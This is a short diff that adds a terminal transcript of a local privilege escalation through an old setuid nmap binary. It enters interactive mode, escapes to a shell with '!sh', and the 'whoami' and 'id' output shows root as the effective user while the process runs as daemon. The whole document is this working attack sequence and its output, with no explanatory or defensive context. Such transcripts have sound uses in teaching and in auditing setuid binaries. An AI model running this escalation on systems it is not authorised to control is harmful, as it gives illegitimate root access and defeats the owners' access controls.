@@ -1,0 +1,11 @@
+$ nmap --interactive
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+
+nmap> !sh
+
+$ whoami
+root
+
+$ id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
